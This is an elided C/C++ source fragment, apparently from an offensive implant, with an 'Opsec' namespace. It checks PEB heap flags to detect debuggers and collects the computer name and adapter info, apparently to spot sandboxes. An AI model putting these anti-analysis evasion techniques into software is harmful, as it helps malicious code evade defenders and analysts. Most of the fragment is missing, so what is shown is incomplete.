...
namespace Opsec {
...
#else
        pHeapBase               = C_PTR(*UL_PPTR(B_PTR(pPeb) + 0x30));
        HeapFlagsOffset         = VistaOrGreater ? 0x70 : 0x14;
        HeapForceFlagsOffset    = VistaOrGreater ? 0x74 : 0x18;
#endif
        auto HeapFlags          = UL_PPTR(B_PTR(pHeapBase) + HeapFlagsOffset);
        auto HeapForceFlags     = UL_PPTR(B_PTR(pHeapBase) + HeapForceFlagsOffset);
    ...
    VOID SeCheckEnvironment() {
        ...
        if (!Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, buffer, &length)) {
            buffer = PCHAR_CAST(Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
        ...
        if (Ctx->win32.GetAdaptersInfo(adapter, &length)) {
            adapter = ADAPTER_CAST(Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
